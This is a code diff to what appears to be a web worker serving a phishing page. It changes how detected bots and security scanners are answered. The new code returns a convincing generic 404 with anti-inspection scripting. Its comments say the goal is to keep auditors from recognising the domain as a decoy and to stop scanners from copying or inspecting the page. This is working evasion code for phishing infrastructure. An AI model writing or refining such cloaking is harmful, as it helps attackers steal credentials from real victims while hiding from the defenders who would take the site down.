@@ -167,11 +167,19 @@ async function handleRequest(request) {
       return servePhishingPage(request);
     }
   } else {
-    // Bot detected - return white page with anti-scraping protection
-    console.log('[Worker] Bot blocked:', botCheck.reason, botCheck.signature || '');
-    const whitePage = `<!DOCTYPE html><html><head><meta charset="UTF-8"><style>body{margin:0;padding:0;background:#fff;overflow:hidden;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}</style><script>document.addEventListener('keydown',function(e){if(e.ctrlKey||e.metaKey){e.preventDefault();e.stopPropagation()}if(e.key==='F12'||e.key==='F12'){e.preventDefault()}if(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='i')){e.preventDefault()}if(e.ctrlKey&&e.key==='u'){e.preventDefault()}if(e.ctrlKey&&e.key==='s'){e.preventDefault()}if(e.ctrlKey&&e.key==='p'){e.preventDefault()}});document.addEventListener('contextmenu',function(e){e.preventDefault()});document.addEventListener('selectstart',function(e){e.preventDefault()})<\/script></head><body></body></html>`;
-    return new Response(whitePage, {
-      status: 200,
+    // Bot detected - return a 404, not a blank 200.
+    //
+    // A blank 200 is itself a fingerprint: a host that answers 200 with zero
+    // content is a well-known decoy pattern, so anyone auditing the domain can
+    // see through it. A 404 is a high-volume, unremarkable response.
+    //
+    // The body is generic on purpose - no branding, no product name, nothing
+    // that ties it to this deployment - and it keeps the anti-scraping script
+    // so a scanner that does render it still cannot copy or inspect it.
+    console.log('[Worker] Bot blocked (404):', botCheck.reason);
+    const notFound = `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>404 - Page Not Found</title><style>html,body{margin:0;padding:0;background:#fff}body{min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:#222;overflow:hidden;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}main{max-width:420px;padding:32px 24px;text-align:center}.code{font-size:48px;font-weight:700;line-height:1;margin-bottom:14px;letter-spacing:-.02em}h1{font-size:18px;font-weight:600;margin:0 0 10px}p{font-size:14px;line-height:1.6;color:#666;margin:0}</style><script>document.addEventListener('keydown',function(e){if(e.ctrlKey||e.metaKey){e.preventDefault();e.stopPropagation()}if(e.key==='F12'){e.preventDefault()}if(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='i')){e.preventDefault()}if(e.ctrlKey&&e.key==='u'){e.preventDefault()}if(e.ctrlKey&&e.key==='s'){e.preventDefault()}if(e.ctrlKey&&e.key==='p'){e.preventDefault()}});document.addEventListener('contextmenu',function(e){e.preventDefault()});document.addEventListener('selectstart',function(e){e.preventDefault()})<\/script></head><body><main><div class="code">404</div><h1>Page Not Found</h1><p>The page you are looking for does not exist or has been moved.</p></main></body></html>`;
+    return new Response(notFound, {
+      status: 404,
       headers: {
         'Content-Type': 'text/html; charset=utf-8',
         'Cache-Control': 'no-cache, no-store, must-revalidate',
